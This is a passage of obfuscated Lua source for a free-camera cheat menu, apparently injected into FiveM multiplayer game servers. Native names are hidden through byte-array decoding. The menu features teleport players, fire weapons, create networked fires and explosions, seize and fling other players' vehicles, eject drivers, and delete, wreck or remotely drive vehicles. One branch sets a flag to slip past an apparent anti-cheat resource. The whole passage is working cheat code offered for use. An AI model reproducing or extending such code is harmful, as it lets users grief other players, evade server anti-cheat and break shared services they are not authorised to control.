                        local grayValue = math.max(150, 255 - distanceFromSelected * 30)
                        g(nativeNames.SetTextColour)(grayValue, grayValue, grayValue, alpha)
                        text = feature
                    end

                    g(nativeNames.BeginTextCommandDisplayText)(decode({83,84,82,73,78,71}))
                    g(nativeNames.AddTextComponentSubstringPlayerName)(text)
                    g(nativeNames.EndTextCommandDisplayText)(centerX, yPos)
                end
            end

            function _G.nexusFreecam.ToggleCamera()
                _G.nexusFreecam.isToggled = not _G.nexusFreecam.isToggled
                if _G.nexusFreecam.isToggled then
                    if _G.nexusFreecam.savedFeature and type(_G.nexusFreecam.savedFeature) == "number" and _G.nexusFreecam.savedFeature >= 1 and _G.nexusFreecam.savedFeature <= #_G.nexusFreecam.cameraFeatures then
                        _G.nexusFreecam.currentFeature = _G.nexusFreecam.savedFeature
                    else
                        if not _G.nexusFreecam.savedFeature or _G.nexusFreecam.savedFeature < 1 or _G.nexusFreecam.savedFeature > #_G.nexusFreecam.cameraFeatures then
                            _G.nexusFreecam.savedFeature = 1
                        end
                        _G.nexusFreecam.currentFeature = _G.nexusFreecam.savedFeature
                    end
                    local coords = g(nativeNames.GetGameplayCamCoord)()
                    local rot = g(nativeNames.GetGameplayCamRot)(2)
                    local levelRot = vector3(0.0, 0.0, rot.z)
                    _G.nexusFreecam.camera = g(nativeNames.CreateCamWithParams)(decode({68,69,70,65,85,76,84,95,83,67,82,73,80,84,69,68,95,67,65,77,69,82,65}), coords.x, coords.y, coords.z, levelRot.x, levelRot.y, levelRot.z, 70.0)
                    g(nativeNames.SetCamActive)(_G.nexusFreecam.camera, true)
                    g(nativeNames.RenderScriptCams)(true, true, 500, false, false)
                    g(nativeNames.CreateThread)(function()
                        wait(550)
                        if _G.nexusFreecam and not _G.nexusFreecam.shutdown then
                            _G.nexusFreecam.cameraReady = true
                        end
                    end)
                else
                    _G.nexusFreecam.savedFeature = _G.nexusFreecam.currentFeature
                    _G.nexusFreecam.cameraReady = false
                    if _G.nexusFreecam.camera then
                        g(nativeNames.SetCamActive)(_G.nexusFreecam.camera, false)
                        g(nativeNames.RenderScriptCams)(false, true, 500, false, false)
                        g(nativeNames.DestroyCam)(_G.nexusFreecam.camera)
                        _G.nexusFreecam.camera = nil
                    end
                    if _G.rcCarControlActive then
                        if _G.rcCameraControl ~= nil then
                            g(nativeNames.RenderScriptCams)(false, true, 1000, true, true)
                            g(nativeNames.DestroyCam)(_G.rcCameraControl, false)
                            _G.rcCameraControl = nil
                        end
                        _G.rcCarControlActive = false
                        _G.rcCarControl = nil
                    end
                    g(nativeNames.SetFocusEntity)(g(nativeNames.PlayerPedId)())
                    g(nativeNames.EnableControlAction)(0, 14, true)
                    g(nativeNames.EnableControlAction)(0, 15, true)
                    g(nativeNames.EnableControlAction)(0, 16, true)
                    g(nativeNames.EnableControlAction)(0, 17, true)
                end
            end

            g(nativeNames.CreateThread)(function()
                while _G.nexusFreecam and not _G.nexusFreecam.shutdown do
                    wait(0)
                    if _G.nexusFreecam and _G.nexusFreecam.isToggled then
                        _G.nexusFreecam.drawFeatureList()
                        _G.nexusFreecam.drawCrosshair()
                    end
                end
            end)

            g(nativeNames.CreateThread)(function()
                while _G.nexusFreecam and not _G.nexusFreecam.shutdown do
                    wait(0)
                    if _G.nexusFreecam and _G.nexusFreecam.isToggled and _G.nexusFreecam.camera then
                        local isRCActive = _G.rcCarControlActive == true
                        
                        if not isRCActive then
                            g(nativeNames.DisableControlAction)(0, 14, true)
                            g(nativeNames.DisableControlAction)(0, 15, true)
                            g(nativeNames.DisableControlAction)(0, 16, true)
                            g(nativeNames.DisableControlAction)(0, 17, true)
                            local coords = g(nativeNames.GetCamCoord)(_G.nexusFreecam.camera)
                            local rot = g(nativeNames.GetCamRot)(_G.nexusFreecam.camera, 2)
                            local direction = _G.nexusFreecam.RotationToDirection(rot)
                            local hMove = g(nativeNames.GetControlNormal)(0, 1) * 12
                            local vMove = g(nativeNames.GetControlNormal)(0, 2) * 12
                            if hMove ~= 0.0 or vMove ~= 0.0 then
                                local newPitch = rot.x - vMove
                                local newYaw = rot.z - hMove
                                newPitch = math.max(-89.0, math.min(89.0, newPitch))
                                g(nativeNames.SetCamRot)(_G.nexusFreecam.camera, newPitch, 0.0, newYaw)
                            end
                            local speed = g(nativeNames.IsDisabledControlPressed)(0, 21) and (_G.nexusFreecam.cameraSpeed + 4.0) or _G.nexusFreecam.cameraSpeed
                            local moveVector = vector3(0, 0, 0)

                            if g(nativeNames.IsDisabledControlPressed)(0, 32) then
                                moveVector = moveVector + direction
                            end
                            if g(nativeNames.IsDisabledControlPressed)(0, 33) then
                                moveVector = moveVector - direction
                            end
                            if g(nativeNames.IsDisabledControlPressed)(0, 34) then
                                moveVector = moveVector + vector3(-direction.y, direction.x, 0.0)
                            end
                            if g(nativeNames.IsDisabledControlPressed)(0, 35) then
                                moveVector = moveVector + vector3(direction.y, -direction.x, 0.0)
                            end

                            if moveVector ~= vector3(0, 0, 0) then
                                local normalizedMove = moveVector / #moveVector
                                local newPosition = coords + normalizedMove * speed
                                g(nativeNames.SetCamCoord)(_G.nexusFreecam.camera, newPosition.x, newPosition.y, newPosition.z)
                            end
                            g(nativeNames.TaskStandStill)(g(nativeNames.PlayerPedId)(), 10)
                            g(nativeNames.SetFocusPosAndVel)(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)
                        end
                        
                        local coords = g(nativeNames.GetCamCoord)(_G.nexusFreecam.camera)
                        local rot = g(nativeNames.GetCamRot)(_G.nexusFreecam.camera, 2)
                        local direction = _G.nexusFreecam.RotationToDirection(rot)
                        local raycast = g(nativeNames.StartExpensiveSynchronousShapeTestLosProbe)(coords.x, coords.y, coords.z, coords.x + direction.x * 500.0, coords.y + direction.y * 500.0, coords.z + direction.z * 500.0, -1)
                        local _, hit, endCoords, _, entityHit = g(nativeNames.GetShapeTestResult)(raycast)

                        if g(nativeNames.IsControlJustPressed)(0, 172) or g(nativeNames.IsControlJustPressed)(0, 241) then
                            local prevFeature = _G.nexusFreecam.currentFeature
                            _G.nexusFreecam.currentFeature = _G.nexusFreecam.currentFeature - 1
                            if _G.nexusFreecam.currentFeature < 1 then
                                _G.nexusFreecam.currentFeature = #_G.nexusFreecam.cameraFeatures
                            end
                            _G.nexusFreecam.savedFeature = _G.nexusFreecam.currentFeature
                            local scrollDiff = (prevFeature - _G.nexusFreecam.currentFeature) * 0.025
                            if scrollDiff < -0.15 then scrollDiff = scrollDiff + (#_G.nexusFreecam.cameraFeatures * 0.025) end
                            if scrollDiff > 0.15 then scrollDiff = scrollDiff - (#_G.nexusFreecam.cameraFeatures * 0.025) end
                            _G.nexusFreecam.smoothScrollOffset = _G.nexusFreecam.smoothScrollOffset + scrollDiff
                        elseif g(nativeNames.IsControlJustPressed)(0, 173) or g(nativeNames.IsControlJustPressed)(0, 242) then
                            local prevFeature = _G.nexusFreecam.currentFeature
                            _G.nexusFreecam.currentFeature = _G.nexusFreecam.currentFeature + 1
                            if _G.nexusFreecam.currentFeature > #_G.nexusFreecam.cameraFeatures then
                                _G.nexusFreecam.currentFeature = 1
                            end
                            _G.nexusFreecam.savedFeature = _G.nexusFreecam.currentFeature
                            local scrollDiff = (prevFeature - _G.nexusFreecam.currentFeature) * 0.025
                            if scrollDiff < -0.15 then scrollDiff = scrollDiff + (#_G.nexusFreecam.cameraFeatures * 0.025) end
                            if scrollDiff > 0.15 then scrollDiff = scrollDiff - (#_G.nexusFreecam.cameraFeatures * 0.025) end
                            _G.nexusFreecam.smoothScrollOffset = _G.nexusFreecam.smoothScrollOffset + scrollDiff
                        end

                        if _G.nexusFreecam.cameraFeatures[_G.nexusFreecam.currentFeature] == "TP Camera" then
                            if g(nativeNames.IsDisabledControlJustPressed)(0, 24) then
                                if hit then
                                    local currentRot = g(nativeNames.GetCamRot)(_G.nexusFreecam.camera, 2)
                                    local currentCamCoords = g(nativeNames.GetCamCoord)(_G.nexusFreecam.camera)
                                    local distance = math.sqrt((endCoords.x - currentCamCoords.x)^2 + (endCoords.y - currentCamCoords.y)^2 + (endCoords.z - currentCamCoords.z)^2)
                                    local maxDistance = 500.0
                                    if distance <= maxDistance and endCoords.x ~= 0.0 and endCoords.y ~= 0.0 and endCoords.z ~= 0.0 then
                                        g(nativeNames.SetCamCoord)(_G.nexusFreecam.camera, endCoords.x, endCoords.y, endCoords.z)
                                        g(nativeNames.SetCamRot)(_G.nexusFreecam.camera, currentRot.x, currentRot.y, currentRot.z, 2)
                                    end
                                end
                            end
                        elseif _G.nexusFreecam.cameraFeatures[_G.nexusFreecam.currentFeature] == "Teleport" then
                            if g(nativeNames.IsDisabledControlJustPressed)(0, 24) then
                                if hit then
                                    if entityHit ~= 0 and g(nativeNames.IsEntityAVehicle)(entityHit) then
                                        local vehicle = entityHit
                                        local playerPed = g(nativeNames.PlayerPedId)()
                                        local seat = _G.nexusFreecam.GetEmptySeat(vehicle)
                                        if seat == -1 then
                                            g(nativeNames.TaskWarpPedIntoVehicle)(playerPed, vehicle, -1)
                                        elseif seat >= 0 then
                                            g(nativeNames.TaskWarpPedIntoVehicle)(playerPed, vehicle, seat)
                                        end
                                    else
                                        g(nativeNames.SetEntityCoords)(g(nativeNames.PlayerPedId)(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                    end
                                end
                            end
                        elseif _G.nexusFreecam.cameraFeatures[_G.nexusFreecam.currentFeature] == "Shoot" then
                            if g(nativeNames.IsControlJustPressed)(0, FREECAM_LEFT_CONTROL) then
                                _G.nexusFreecam.currentModelIndex = _G.nexusFreecam.currentModelIndex - 1
                                if _G.nexusFreecam.currentModelIndex < 1 then
                                    _G.nexusFreecam.currentModelIndex = #_G.nexusFreecam.pistolModels
                                end
                            elseif g(nativeNames.IsControlJustPressed)(0, FREECAM_RIGHT_CONTROL) then
                                _G.nexusFreecam.currentModelIndex = _G.nexusFreecam.currentModelIndex + 1
                                if _G.nexusFreecam.currentModelIndex > #_G.nexusFreecam.pistolModels then
                                    _G.nexusFreecam.currentModelIndex = 1
                                end
                            end
                            if g(nativeNames.IsDisabledControlJustPressed)(0, 24) then
                                local playerPed = g(nativeNames.PlayerPedId)()
                                local weaponHash = g(nativeNames.GetHashKey)(_G.nexusFreecam.pistolModels[_G.nexusFreecam.currentModelIndex].model)
                                if g(nativeNames.GetResourceState)(decode({82,101,97,112,101,114,86,52})) == "started" then
                                    LocalPlayer.state:set("reaper_" .. weaponHash, true, true)
                                    g(nativeNames.GiveWeaponToPed)(playerPed, weaponHash, 255, false, true)
                                else
                                    g(nativeNames.GiveWeaponToPed)(playerPed, weaponHash, 255, false, true)
                                    g(nativeNames.SetCurrentPedWeapon)(playerPed, weaponHash, true)
                                end
                                local damage = 100
                                if _G.nexusFreecam.pistolModels[_G.nexusFreecam.currentModelIndex].model == decode({119,101,97,112,111,110,95,115,116,117,110,103,117,110}) then
                                    damage = 0
                                end
                                g(nativeNames.ShootSingleBulletBetweenCoords)(
                                    coords.x, coords.y, coords.z,
                                    coords.x + direction.x * 500.0,
                                    coords.y + direction.y * 500.0,
                                    coords.z + direction.z * 500.0,
                                    damage,
                                    true,
                                    weaponHash,
                                    playerPed,
                                    true,
                                    false,
                                    1000.0
                                )
                            end
                        end

                        if _G.nexusFreecam.cameraFeatures[_G.nexusFreecam.currentFeature] == "Shoot Car" then
                            if g(nativeNames.IsControlJustPressed)(0, FREECAM_LEFT_CONTROL) then
                                _G.nexusFreecam.currentVehicleIndex = _G.nexusFreecam.currentVehicleIndex - 1
                                if _G.nexusFreecam.currentVehicleIndex < 1 then
                                    _G.nexusFreecam.currentVehicleIndex = #_G.nexusFreecam.vehicleModels
                                end
                            elseif g(nativeNames.IsControlJustPressed)(0, FREECAM_RIGHT_CONTROL) then
                                _G.nexusFreecam.currentVehicleIndex = _G.nexusFreecam.currentVehicleIndex + 1
                                if _G.nexusFreecam.currentVehicleIndex > #_G.nexusFreecam.vehicleModels then
                                    _G.nexusFreecam.currentVehicleIndex = 1
                                end
                            end
                            if g(nativeNames.IsDisabledControlJustPressed)(0, 24) then
                                local from = g(nativeNames.GetCamCoord)(_G.nexusFreecam.camera)
                                local rot = g(nativeNames.GetCamRot)(_G.nexusFreecam.camera, 2)
                                local pitch = math.rad(rot.x)
                                local yaw = math.rad(rot.z)
                                local direction = vector3(
                                    -math.sin(yaw) * math.cos(pitch),
                                    math.cos(yaw) * math.cos(pitch),
                                    math.sin(pitch)
                                )
                                local targetPoint = from + direction * 500.0
                                local model = _G.nexusFreecam.vehicleModels[_G.nexusFreecam.currentVehicleIndex].model
                                local modelHash = g(nativeNames.GetHashKey)(model)
                                g(nativeNames.RequestModel)(modelHash)
                                local timeout = 0
                                while not g(nativeNames.HasModelLoaded)(modelHash) and timeout < 100 do
                                    wait(10)
                                    timeout = timeout + 1
                                end
                                if g(nativeNames.HasModelLoaded)(modelHash) then
                                    local spawnCoords = from + direction * 3.0 + vector3(0, 0, 1.0)
                                    if g(nativeNames.GetResourceState)(decode({101,115,95,101,120,116,101,110,100,101,100})) == "started" then
                                        local success, result = pcall(function()
                                            ESX.Game.SpawnVehicle(model, vector3(spawnCoords.x, spawnCoords.y, spawnCoords.z), rot.z, function(vehicle)
                                                if g(nativeNames.DoesEntityExist)(vehicle) then
                                                    g(nativeNames.SetEntityAsMissionEntity)(vehicle, true, true)
                                                    g(nativeNames.SetVehicleEngineOn)(vehicle, true, true, false)
                                                    g(nativeNames.SetVehicleForwardSpeed)(vehicle, 0.0)
                                                    g(nativeNames.SetEntityRotation)(vehicle, rot.x, rot.y, rot.z, 2, true)
                                                    local function blastVehicle(entity)
                                                        if not g(nativeNames.DoesEntityExist)(entity) then return end
                                                        local shootDirection = targetPoint - from
                                                        local distance = math.max(#shootDirection, 1.0)
                                                        local normalizedDirection = shootDirection / distance
                                                        local baseForce = (model == "luxor" or model == "luxor2") and 320.0 or 220.0
                                                        local verticalBoost = (model == "luxor" or model == "luxor2") and 25.0 or 12.5
                                                        local impulseX = normalizedDirection.x * baseForce
                                                        local impulseY = normalizedDirection.y * baseForce
                                                        local impulseZ = normalizedDirection.z * baseForce + verticalBoost
                                                        for i = 1, 3 do
                                                            g(nativeNames.ApplyForceToEntity)(entity, 1, impulseX, impulseY, impulseZ, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                                            wait(0)
                                                        end
                                                    end
                                                    g(nativeNames.CreateThread)(function()
                                                        wait(75)
                                                        blastVehicle(vehicle)
                                                    end)
                                                else
                                                    g(nativeNames.SetModelAsNoLongerNeeded)(modelHash)
                                                end
                                            end)
                                        end)
                                    else
                                        local vehicleEntity = g(nativeNames.CreateVehicle)(modelHash, spawnCoords.x, spawnCoords.y, spawnCoords.z, rot.z, true, true)
                                        if vehicleEntity and g(nativeNames.DoesEntityExist)(vehicleEntity) then
                                            g(nativeNames.SetEntityAsMissionEntity)(vehicleEntity, true, true)
                                            g(nativeNames.SetVehicleEngineOn)(vehicleEntity, true, true, false)
                                            g(nativeNames.SetVehicleForwardSpeed)(vehicleEntity, 0.0)
                                            g(nativeNames.SetEntityRotation)(vehicleEntity, rot.x, rot.y, rot.z, 2, true)
                                            g(nativeNames.CreateThread)(function()
                                                wait(75)
                                                if g(nativeNames.DoesEntityExist)(vehicleEntity) then
                                                    local shootDirection = targetPoint - from
                                                    local distance = math.max(#shootDirection, 1.0)
                                                    local normalizedDirection = shootDirection / distance
                                                    local baseForce = (model == "luxor" or model == "luxor2") and 320.0 or 220.0
                                                    local verticalBoost = (model == "luxor" or model == "luxor2") and 25.0 or 12.5
                                                    local impulseX = normalizedDirection.x * baseForce
                                                    local impulseY = normalizedDirection.y * baseForce
                                                    local impulseZ = normalizedDirection.z * baseForce + verticalBoost
                                                    for i = 1, 3 do
                                                        g(nativeNames.ApplyForceToEntity)(vehicleEntity, 1, impulseX, impulseY, impulseZ, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                                        wait(0)
                                                    end
                                                end
                                            end)
                                            g(nativeNames.SetModelAsNoLongerNeeded)(modelHash)
                                        else
                                            g(nativeNames.SetModelAsNoLongerNeeded)(modelHash)
                                        end
                                    end
                                end
                            end
                        elseif _G.nexusFreecam.cameraFeatures[_G.nexusFreecam.currentFeature] == "Spawn Bomb" then
                            if g(nativeNames.IsControlJustPressed)(0, FREECAM_LEFT_CONTROL) then
                                _G.nexusFreecam.currentExplosionIndex = _G.nexusFreecam.currentExplosionIndex - 1
                                if _G.nexusFreecam.currentExplosionIndex < 1 then
                                    _G.nexusFreecam.currentExplosionIndex = #_G.nexusFreecam.explosionTypes
                                end
                            elseif g(nativeNames.IsControlJustPressed)(0, FREECAM_RIGHT_CONTROL) then
                                _G.nexusFreecam.currentExplosionIndex = _G.nexusFreecam.currentExplosionIndex + 1
                                if _G.nexusFreecam.currentExplosionIndex > #_G.nexusFreecam.explosionTypes then
                                    _G.nexusFreecam.currentExplosionIndex = 1
                                end
                            end
                            if g(nativeNames.IsDisabledControlJustPressed)(0, 24) then
                                if hit then
                                    local explosionCoords = endCoords
                                    local explosionType = _G.nexusFreecam.explosionTypes[_G.nexusFreecam.currentExplosionIndex].type
                                    if explosionType == "default" then
                                        local model = "prop_aircon_m_04"
                                        local spawnCoords = {x = explosionCoords.x, y = explosionCoords.y, z = explosionCoords.z - 1.0}
                                        g(nativeNames.CreateThread)(function()
                                            g(nativeNames.RequestModel)(model)
                                            while not g(nativeNames.HasModelLoaded)(model) do
                                                g(nativeNames.Wait)(0)
                                            end
                                            local obj = g(nativeNames.CreateObjectNoOffset)(model, spawnCoords.x, spawnCoords.y, spawnCoords.z, true, true, false)
                                            if obj and g(nativeNames.DoesEntityExist)(obj) then
                                                g(nativeNames.NetworkRegisterEntityAsNetworked)(obj)
                                                local netId = g(nativeNames.ObjToNet)(obj)
                                                g(nativeNames.SetNetworkIdExistsOnAllMachines)(netId, true)
                                                g(nativeNames.SetNetworkIdCanMigrate)(netId, true)
                                                g(nativeNames.PlaceObjectOnGroundProperly)(obj)
                                                g(nativeNames.SetEntityVisible)(obj, false, false)
                                                g(nativeNames.SetEntityCollision)(obj, false, false)
                                                g(nativeNames.FreezeEntityPosition)(obj, true)
                                                local pos = g(nativeNames.GetEntityCoords)(obj)
                                                local fireIds = {}
                                                local offsets = {{0.0, 0.0, 0.0}, {0.35, 0.0, 0.0}, {-0.35, 0.0, 0.0}, {0.0, 0.35, 0.0}, {0.0, -0.35, 0.0}}
                                                for i=1, #offsets do
                                                    local off = offsets[i]
                                                    local id = g(nativeNames.StartScriptFire)(pos.x + off[1], pos.y + off[2], pos.z + off[3], 25, false)
                                                    if id and id ~= -1 then
                                                        fireIds[#fireIds+1] = id
                                                    end
                                                end
                                                local entFire = g(nativeNames.StartEntityFire)(obj)
                                                local timeout = g(nativeNames.GetGameTimer)() + 10000
                                                while g(nativeNames.GetGameTimer)() < timeout and g(nativeNames.DoesEntityExist)(obj) do
                                                    g(nativeNames.Wait)(200)
                                                end
                                                for i=1, #fireIds do
                                                    g(nativeNames.RemoveScriptFire)(fireIds[i])
                                                end
                                                if entFire and entFire ~= -1 then
                                                    g(nativeNames.RemoveScriptFire)(entFire)
                                                end
                                                g(nativeNames.StopEntityFire)(obj)
                                                if g(nativeNames.DoesEntityExist)(obj) then
                                                    g(nativeNames.DeleteObject)(obj)
                                                end
                                                g(nativeNames.SetModelAsNoLongerNeeded)(model)
                                            end
                                        end)
                                    else
                                        local model = ""
                                        if explosionType == "car" then model = "adder"
                                        elseif explosionType == "plane" then model = "nimbus"
                                        elseif explosionType == "boat" then model = "dinghy"
                                        elseif explosionType == "heli" then model = "frogger"
                                        end
                                        if model ~= "" then
                                            g(nativeNames.CreateThread)(function()
                                                local coords = explosionCoords
                                                local heading = 0.0
                                                g(nativeNames.RequestModel)(model)
                                                while not g(nativeNames.HasModelLoaded)(model) do
                                                    g(nativeNames.Wait)(1)
                                                end
                                                local vehicle = g(nativeNames.CreateVehicle)(g(nativeNames.GetHashKey)(model), coords.x, coords.y, coords.z, heading, true, true)
                                                while not g(nativeNames.DoesEntityExist)(vehicle) do
                                                    g(nativeNames.Wait)(1)
                                                end
                                                g(nativeNames.SetEntityCollision)(vehicle, false, false)
                                                g(nativeNames.FreezeEntityPosition)(vehicle, true)
                                                g(nativeNames.NetworkExplodeVehicle)(vehicle, true, false, false)
                                                g(nativeNames.Wait)(500)
                                                if g(nativeNames.DoesEntityExist)(vehicle) then
                                                    g(nativeNames.DeleteEntity)(vehicle)
                                                end
                                                g(nativeNames.SetModelAsNoLongerNeeded)(model)
                                            end)
                                        end
                                    end
                                end
                            end
                        end

                        if _G.nexusFreecam.cameraFeatures[_G.nexusFreecam.currentFeature] == "Blackhole" then
                            local isPressed = g(nativeNames.IsDisabledControlPressed)(0, 24)
                            local wasPressed = _G.nexusFreecam.blackholePressed
                            _G.nexusFreecam.blackholeFrameCount = _G.nexusFreecam.blackholeFrameCount + 1
                            local shouldUpdate = (_G.nexusFreecam.blackholeFrameCount %% 3 == 0) or (wasPressed and not isPressed)
                            if isPressed and shouldUpdate then
                                local vehiclePool = g(nativeNames.GetGamePool)("CVehicle")
                                if vehiclePool then
                                    local maxDistanceSq = 200.0 * 200.0
                                    local minDistanceSq = 0.1 * 0.1
                                    local processedCount = 0
                                    local maxPerFrame = 45
                                    for _, vehicle in pairs(vehiclePool) do
                                        if processedCount >= maxPerFrame then break end
                                        if vehicle and g(nativeNames.DoesEntityExist)(vehicle) then
                                            if g(nativeNames.IsEntityAVehicle)(vehicle) then
                                                local vehicleCoords = g(nativeNames.GetEntityCoords)(vehicle)
                                                local dx = coords.x - vehicleCoords.x
                                                local dy = coords.y - vehicleCoords.y
                                                local dz = coords.z - vehicleCoords.z
                                                local distanceSq = dx * dx + dy * dy + dz * dz
                                                if distanceSq < maxDistanceSq and distanceSq > minDistanceSq then
                                                    local distance = math.sqrt(distanceSq)
                                                    local normalized = vector3(dx / distance, dy / distance, dz / distance)
                                                    local pullStrength = math.min(350.0, 600.0 / math.max(distance, 1.0))
                                                    local forceX = normalized.x * pullStrength
                                                    local forceY = normalized.y * pullStrength
                                                    local forceZ = normalized.z * pullStrength
                                                    if not _G.nexusFreecam.blackholeControlledVehicles[vehicle] then
                                                        g(nativeNames.NetworkRequestControlOfEntity)(vehicle)
                                                        _G.nexusFreecam.blackholeControlledVehicles[vehicle] = true
                                                    end
                                                    g(nativeNames.ApplyForceToEntity)(vehicle, 3, forceX, forceY, forceZ, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                                    processedCount = processedCount + 1
                                                end
                                            end
                                        end
                                    end
                                end
                            elseif wasPressed and not isPressed then
                                local vehiclePool = g(nativeNames.GetGamePool)("CVehicle")
                                if vehiclePool then
                                    local maxDistanceSq = 50.0 * 50.0
                                    for _, vehicle in pairs(vehiclePool) do
                                        if vehicle and g(nativeNames.DoesEntityExist)(vehicle) then
                                            if g(nativeNames.IsEntityAVehicle)(vehicle) then
                                                local vehicleCoords = g(nativeNames.GetEntityCoords)(vehicle)
                                                local dx = coords.x - vehicleCoords.x
                                                local dy = coords.y - vehicleCoords.y
                                                local dz = coords.z - vehicleCoords.z
                                                local distanceSq = dx * dx + dy * dy + dz * dz
                                                if distanceSq < maxDistanceSq then
                                                    local launchStrength = 320.0
                                                    local forceX = direction.x * launchStrength
                                                    local forceY = direction.y * launchStrength
                                                    local forceZ = direction.z * launchStrength
                                                    g(nativeNames.NetworkRequestControlOfEntity)(vehicle)
                                                    g(nativeNames.ApplyForceToEntity)(vehicle, 3, forceX, forceY, forceZ, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                                end
                                            end
                                        end
                                    end
                                end
                                _G.nexusFreecam.blackholeControlledVehicles = {}
                            end
                            if not isPressed and wasPressed then
                                _G.nexusFreecam.blackholeControlledVehicles = {}
                            end
                            _G.nexusFreecam.blackholePressed = isPressed
                        end

                        if _G.nexusFreecam.cameraFeatures[_G.nexusFreecam.currentFeature] == "Kick Vehicle" then
                            if g(nativeNames.IsDisabledControlJustPressed)(0, 24) then
                                if hit and entityHit ~= 0 and g(nativeNames.IsEntityAVehicle)(entityHit) then
                                    local vehicle = entityHit
                                    local driver = _g(_b("GetPedInVehicleSeat"))(vehicle, -1)
                                    if driver and driver ~= 0 and _g(_b("DoesEntityExist"))(driver) then
                                        _g(_b("TaskLeaveVehicle"))(driver, vehicle, 0)
                                        _g(_b("SetPedCanRagdoll"))(driver, true)
                                        _g(_b("SetPedToRagdoll"))(driver, 1000, 1000, 0, 0, 0, 0)
                                    end
                                end
                            end
                        elseif _G.nexusFreecam.cameraFeatures[_G.nexusFreecam.currentFeature] == "Delete Vehicle" then
                            if g(nativeNames.IsDisabledControlJustPressed)(0, 24) then
                                if hit and entityHit ~= 0 and g(nativeNames.IsEntityAVehicle)(entityHit) then
                                    local vehicle = entityHit
                                    _g(_b("NetworkRequestControlOfEntity"))(vehicle)
                                    _g(_b("Wait"))(100)
                                    _g(_b("SetEntityAsMissionEntity"))(vehicle, true, true)
                                    _g(_b("DeleteEntity"))(vehicle)
                                    _g(_b("DeleteVehicle"))(vehicle)
                                end
                            end
                        elseif _G.nexusFreecam.cameraFeatures[_G.nexusFreecam.currentFeature] == "Fuck Vehicle" then
                            if g(nativeNames.IsDisabledControlJustPressed)(0, 24) then
                                if hit and entityHit ~= 0 and g(nativeNames.IsEntityAVehicle)(entityHit) then
                                    local vehicle = entityHit
                                    _g(_b("NetworkRequestControlOfEntity"))(vehicle)
                                    _g(_b("Wait"))(100)
                                    for i = 0, 7 do
                                        _g(_b("SetVehicleTyreBurst"))(vehicle, i, true, 1000.0)
                                    end
                                    _g(_b("SetVehicleEngineHealth"))(vehicle, -4000.0)
                                    for i = 0, 5 do
                                        _g(_b("SetVehicleDoorBroken"))(vehicle, i, true)
                                    end
                                    for i = 0, 7 do
                                        _g(_b("SmashVehicleWindow"))(vehicle, i)
                                    end
                                    _g(_b("StartEntityFire"))(vehicle)
                                end
                            end
                        elseif _G.nexusFreecam.cameraFeatures[_G.nexusFreecam.currentFeature] == "RC Control Car" then
                            if g(nativeNames.IsDisabledControlJustPressed)(0, 24) then
                                if hit and entityHit ~= 0 and g(nativeNames.IsEntityAVehicle)(entityHit) then
                                    local vehicle = entityHit
                                    _g(_b("NetworkRequestControlOfEntity"))(vehicle)
                                    _g(_b("Wait"))(100)
                                    if _G.rcCarControlActive then
                                        if _G.rcCameraControl ~= nil then
                                            g(nativeNames.RenderScriptCams)(false, true, 1000, true, true)
                                            g(nativeNames.DestroyCam)(_G.rcCameraControl, false)
                                            _G.rcCameraControl = nil
                                        end
                                        _G.rcCarControlActive = false
                                        _G.rcCarControl = nil
                                    end
                                    _G.rcCarControl = vehicle
                                    _G.rcCarControlActive = true
                                    _G.rcCarControlSpeed = 0.0
                                    g(nativeNames.SetEntityAsMissionEntity)(vehicle, true, true)
                                    g(nativeNames.SetEntityInvincible)(vehicle, true)
                                    g(nativeNames.SetVehicleEngineOn)(vehicle, true, true, false)
                                    g(nativeNames.SetEntityHasGravity)(vehicle, true)
                                    g(nativeNames.FreezeEntityPosition)(vehicle, false)
                                    g(nativeNames.SetEntityCollision)(vehicle, true, true)
                                    g(nativeNames.SetEntityCanBeDamaged)(vehicle, false)
                                    g(nativeNames.SetVehicleCanBeVisiblyDamaged)(vehicle, false)
                                    g(nativeNames.SetVehicleOnGroundProperly)(vehicle)
                                    _G.rcCameraControl = g(nativeNames.CreateCam)(decode({68,69,70,65,85,76,84,95,83,67,82,73,80,84,69,68,95,67,65,77,69,82,65}), true)
                                    g(nativeNames.AttachCamToEntity)(_G.rcCameraControl, vehicle, 0.0, -2.5, 1.5, true)
                                    g(nativeNames.SetCamRot)(_G.rcCameraControl, -5.0, 0.0, g(nativeNames.GetEntityHeading)(vehicle), 2)
                                    g(nativeNames.SetCamActive)(_G.rcCameraControl, true)
                                    g(nativeNames.RenderScriptCams)(true, true, 1000, true, true)
                                    if _G.nexusFreecam and _G.nexusFreecam.camera then
                                        g(nativeNames.SetCamActive)(_G.nexusFreecam.camera, false)
                                    end
                                end
                            end
                            if _G.rcCarControlActive and _G.rcCarControl ~= nil and g(nativeNames.DoesEntityExist)(_G.rcCarControl) then
                                g(nativeNames.SetVehicleEngineOn)(_G.rcCarControl, true, true, false)
                                g(nativeNames.SetEntityInvincible)(_G.rcCarControl, true)
                                g(nativeNames.FreezeEntityPosition)(_G.rcCarControl, false)
                                g(nativeNames.SetEntityHasGravity)(_G.rcCarControl, true)
                                g(nativeNames.SetEntityCollision)(_G.rcCarControl, true, true)
                                local CONTROL_ACCELERATE = 71
                                local CONTROL_BRAKE = 72
                                local CONTROL_MOVE_LEFT = 63
                                local CONTROL_MOVE_RIGHT = 64
                                local CONTROL_EXIT = 73
                                local forward = 0.0
                                if g(nativeNames.IsControlPressed)(0, CONTROL_ACCELERATE) then
                                    forward = 1.0
                                elseif g(nativeNames.IsControlPressed)(0, CONTROL_BRAKE) then
                                    forward = -1.0
                                end
                                local steer = 0.0
                                if g(nativeNames.IsControlPressed)(0, CONTROL_MOVE_RIGHT) then
                                    steer = -1.0
                                elseif g(nativeNames.IsControlPressed)(0, CONTROL_MOVE_LEFT) then
                                    steer = 1.0
                                end
                                local vehicleHeading = g(nativeNames.GetEntityHeading)(_G.rcCarControl)
                                local maxSpeed = 50.0
                                local acceleration = 2.5
                                local deceleration = 3.0
                                local targetSpeed = 0.0
                                if forward ~= 0.0 then
                                    targetSpeed = maxSpeed * forward
                                    if forward > 0 then
                                        if _G.rcCarControlSpeed < targetSpeed then
                                            _G.rcCarControlSpeed = math.min(_G.rcCarControlSpeed + acceleration, targetSpeed)
                                        elseif _G.rcCarControlSpeed > targetSpeed then
